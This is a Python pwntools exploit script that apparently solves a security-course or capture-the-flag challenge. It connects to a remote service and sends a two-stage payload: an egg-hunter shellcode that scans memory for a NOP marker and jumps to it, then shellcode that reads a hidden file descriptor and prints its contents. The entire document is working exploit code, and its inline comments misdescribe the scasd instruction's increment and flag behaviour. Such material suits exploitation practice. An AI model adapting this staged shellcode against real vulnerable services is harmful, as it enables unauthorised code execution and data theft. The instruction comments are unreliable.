#!/usr/bin/env python3

from pwn import *
import argparse

HOST = "6447.lol"
PORT = 20709

context.arch = "amd64"

big_shellcode = asm(
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"
    "nop\n"

    "mov rdi, 1000\n"            # rdi = 1000 (fd)
    "mov rsi, rsp\n"             # rsi = buffer
    "mov rdx, 0x100\n"           # rdx = 256 bytes to read
    "mov rax, 0\n"               # rax = 0 (syscall number for read)
    "syscall\n"                  # invoke read(1000, buffer, 256)

    "mov rdi, 1\n"               # rdi = 1 (stdout)
    "mov rdx, rax\n"             # rdx = number of bytes read
    "mov rax, 1\n"               # rax = 1 (syscall number for write)
    "syscall\n"                  # invoke write(1, buffer, bytes_read)
)

if __name__ == '__main__':
    p = remote(HOST, PORT)
    p.recvuntil(b'new stack ')
    ptr = int(p.recvline().strip(), 16)

    small_shellcode = asm(
        f"mov rdi, {ptr}\n"
        f"mov eax, 0x90909090\n"
        "find_egg:\n"
        "scasd\n"               # compares the value of eax to the value pointed to by edi and adjusts the direction flag 
                                # (if df is clear (0), edi is incremented by 8 and if df is set (1), edi is decremented by 8)
                                # also, sets the zero flag if values are equal (and jnz [jump not zero] is not taken) and clears it if values are not equal
        "jnz find_egg\n"
        "scasd\n"
        "jnz find_egg\n"
        "jmp rdi\n" 
    )

    log.info("sending small payload")
    p.sendline(small_shellcode)
    log.info("sending big payload")
    p.sendline(big_shellcode)
    p.interactive()